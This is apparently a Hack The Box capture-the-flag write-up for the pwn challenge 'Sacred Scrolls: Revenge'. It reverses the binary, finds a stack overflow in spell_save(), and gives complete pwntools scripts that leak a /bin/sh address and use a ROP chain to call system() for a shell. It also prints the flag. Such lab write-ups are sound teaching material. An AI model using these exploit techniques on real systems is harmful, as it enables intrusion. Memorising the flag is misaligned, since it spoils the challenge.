# Sacred Scrolls: Revenge
## DESCRIPTION:
Each house of the campus has its own secret library to store spells or spellbound messages so the others cannot see them. Messages are encrypted and must be signed by the boy who lived, turning them into sacred scrolls, otherwise they are not accepted in this library. You can try it yourself as long as you are a wizard of this house.
## HINT:
- NONE
## STEPS:
1. In this challenge we're given a 64 bit binary, dynamically linked, and not stripped.

```
┌──(brandy㉿bread-yolk)-[~/Downloads/sacred/challenge]
└─$ file sacred_scrolls 
sacred_scrolls: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./glibc/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=983c464996bd6b1517546ea4331d6fecfb642bd1, not stripped
```

> BINARY PROTECTIONS

```
┌──(brandy㉿bread-yolk)-[~/Downloads/sacred/challenge]
└─$ pwn checksec sacred_scrolls 
[*] '/home/brandy/Downloads/sacred/challenge/sacred_scrolls'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'./glibc/'
```

2. After decompiled the binary, I found bunch of hex values at the spell_upload()

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/8e54ba45-a6b8-45f0-a596-38759e62d9e8)


> Turns out it's a bash command, which encode the input to base64 then store it on a spell.zip file.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/f4b56bbd-ba23-4865-bf9a-a6320d07dced)


3. Might be the clue here, interesting. Also great helper, we have system().

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/d8352888-9bc3-4083-be29-144c2d356355)



4. At the spell_read() function, it just unzip the .zip file then read the spell.txt file (the content) and returns it back to the user if conditions are met, nothing interesting at glance.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/9177d5f7-5817-4ca9-bc60-aae89f7443ca)


5. The interesting part is at what it compares our input to.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/0e6d6014-6b25-4bdd-bbf9-fcf0e9a22ba9)


```
Values they compared:
\xf0\x9f\x91\x93\xe2\x9a\xa1
```

> Emojis

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/6fe42969-16ba-48d3-b69a-6dde04e53951)


6. Found the BOF at the spell_save(), it copies up to 600 bytes from param1 where the local_28 only has 32 as it's buffer.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/c0081cd2-ce93-4223-a8dd-dc36fbd7a5f8)


7. Hence the exploit is very straight forward here.

## FLOW AND HOW TO

```
1. Craft the payload (RCE payload because we have system()).
2. Send the payload using the second option.
3. Trigger it using the 3rd option (where potential BOF is at).
```

Things to note we need to encode our payload in base64 too. Anyway let's get the RIP offset by sending our cyclic pattern along with the emojis (since it's compared those at the first 7 bytes).

```console
┌──(brandy㉿bread-yolk)-[~/Downloads/sacred/challenge]
└─$ echo -ne "\xf0\x9f\x91\x93\xe2\x9a\xa1$(pwn cyclic 1024)" > spell.txt
                                                                                                                                                 
┌──(brandy㉿bread-yolk)-[~/Downloads/sacred/challenge]
└─$ zip spell.zip spell.txt            
  adding: spell.txt (deflated 61%)
                                                                                                                                                 
┌──(brandy㉿bread-yolk)-[~/Downloads/sacred/challenge]
└─$ base64 -w0 spell.zip       
UEsDBBQAAAAIAE1CFFe9j2lokwEAAAcEAAAJABwAc3BlbGwudHh0VVQJAAPBLuJkuy7iZHV4CwABBOgDAAAE6AMAAA3NyQ0QMRAAwVixx55juW/IAvHjg0iNCAiBaqnf9e/3j59/f/15oeXt8PF1utweP37pV37tN37rd37vD/7oT/7sL/7qb/6OYCzGYizGYizGYizGYizGYizGYizGYizGYizGYizGYizGYizGYmzGZmzGZmzGZmzGZmzGZmzGZmzGZmzGZmzGZmzGZmzGZmzGZmxGMIIRjGAEIxjBCEYwghGMYAQjGMEIRjCCEYxgBCMYwQhGMA7jMA7jMA7jMA7jMA7jMA7jMA7jMA7jMA7jMA7jMA7jMA7jMA7jMi7jMi7jMi7jMi7jMi7jMi7jMi7jMi7jMi7jMi7jMi7jMi7jMpKRjGQkIxnJSEYykpGMZCQjGclIRjKSkYxkJCMZyUhGMpJRjGIUoxjFKEYxilGMYhSjGMUoRjGKUYxiFKMYxShGMYpRjGY0oxnNaEYzmtGMZjSjGc1oRjOa0YxmNKMZzWhGM5rRjGYMYxjDGMYwhjGMYQxjGMMYxjCGMYxhDGMYwxjGMIYxjGEM42E8jIfxMB7G8x9QSwECHgMUAAAACABNQhRXvY9paJMBAAAHBAAACQAYAAAAAAABAAAApIEAAAAAc3BlbGwudHh0VVQFAAPBLuJkdXgLAAEE6AMAAAToAwAAUEsFBgAAAAABAAEATwAAANYBAAAAAA==
```

> SEND IT

#### NOTES: Dunno why gdb-pwndbg and gdb-peda won't work with this binary, hence i used gdb-gef.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/4869e4a6-a7e5-4399-85e1-101d67b22858)


Again, dunno why it said that our content has invalid character. Tbh i don't understand why it responded like that although the cyclic i encode does not have invalid character. So i think we just have to bruteforced it later, maybe start from 32 bytes.

Anyway we have system(), pop_rdi gadget, now we need the /bin/sh strings, let's check if the binary does have it.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/bd458671-5ea0-4a66-92d2-e78ab35492cb)


Hmmm, it's not easy as it looks like. Anyway, turns out there's binsh strings written in this binary. Found it after i noticed at the main() it accepts so many buffer which should not accepts that big, like for what (?)

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/5a51e231-d3f7-426a-b3b5-bd492aed3f3c)


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/93dd265b-af5c-44ee-bdd3-15f68500f54e)


After checks what stored in the RSI, found this: (run the binary -> ctrl + c -> telescope).


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/11071dd8-9a2b-4af5-9d48-ffdd42c91507)


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/eaf4be07-f41b-49cd-a4d8-4ac1edbf655a)


We can leak it by sending 0x10 buffer (16). So the payload shall look like this:

```
emojis + padding + ret + rdi + binsh + system
```

8. Now let's grab the leaked binsh strings.

> SCRIPT

```py
from pwn import * 
import os
os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)
    
gdbscript="""
init-pwndbg
continue
""".format(**locals())
    
exe = './sacred_scrolls'
elf = context.binary = ELF(exe, checksec=True)
# context.log_level = 'DEBUG'
context.log_level = 'INFO'

sh = start()
rop = ROP(elf)
leak_pad = asm('nop') * 0x10
sh.sendafter(b':', leak_pad) # need sendafter, if using sendlineafter we won't leaked it full
sh.recvuntil(b'library \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90')
get = sh.recvline().strip()
# print(get)
leaked_binsh = unpack(get.ljust(8, b'\x00'))
log.success(f'leaked binsh address --> {hex(leaked_binsh)}')

sh.interactive()
```

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/817b6273-55a1-4b2b-a6af-6605e882f9df)


9. Craft our payload -> convert to spell.txt -> zip it -> send -> trigger.

> CONVERT SCRIPT SNIPPET

```py
with open('spell.txt', 'wb') as f:
    f.write(p)

os.system('zip spell.zip spell.txt')
os.system('rm spell.txt')

with open('spell.zip', 'rb') as f:
    base64_payload = b64e(f.read())
    base64_bytes = base64_payload.encode()
```

> FULL SCRIPT (GOT RCE)

```py
from pwn import * 
import os
os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)
    
gdbscript="""
init-pwndbg
continue
""".format(**locals())
    
exe = './sacred_scrolls'
elf = context.binary = ELF(exe, checksec=True)
# context.log_level = 'DEBUG'
context.log_level = 'INFO'

sh = start()
rop = ROP(elf)
leak_pad = asm('nop') * 0x10
sh.sendafter(b':', leak_pad) # need sendafter, if using sendlineafter we won't leaked it full
sh.recvuntil(b'library \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90')
get = sh.recvline().strip()
# print(get)
leaked_binsh = unpack(get.ljust(8, b'\x00'))
log.success(f'leaked binsh address --> {hex(leaked_binsh)}')

rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
log.success(f'rdi gadget --> {hex(rdi)}')

ret = rop.find_gadget(['ret'])[0]
log.success(f'stack align --> {hex(ret)}')

padding = asm('nop') * 32

p = flat([
    b'\xf0\x9f\x91\x93\xe2\x9a\xa1',
    padding,
    ret,
    rdi,
    leaked_binsh,
    elf.sym['system']
])

# print(p)
with open('spell.txt', 'wb') as f:
    f.write(p)

os.system('zip spell.zip spell.txt')
os.system('rm spell.txt')

with open('spell.zip', 'rb') as f:
    base64_payload = b64e(f.read())
    base64_bytes = base64_payload.encode() # encode to bytes 

sh.sendlineafter(b'>', b'1')
sh.sendlineafter(b':', base64_bytes)

sh.sendlineafter(b'>', b'2')
sh.sendlineafter(b'>', b'3')

sh.interactive()
```

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/d2e634bd-c2e4-4bef-8997-555c8f4dbd89)


10. Got End Of File, add more padding to it (add 1 bytes, we don't want to much because we're bruteforcing offset).

> RESULT - GOT SHELL

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/539e97cd-fce1-4708-bb57-252a3a021bfc)


> TEST REMOTELY

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/79cc4ddb-ead5-4d30-87ad-c6c96ec3bc8f)


11. Got the flag!

## FLAG

```
HTB{s1gn3ed_sp3ll5_fr0m_th3_b01_wh0_l1v3d}
```



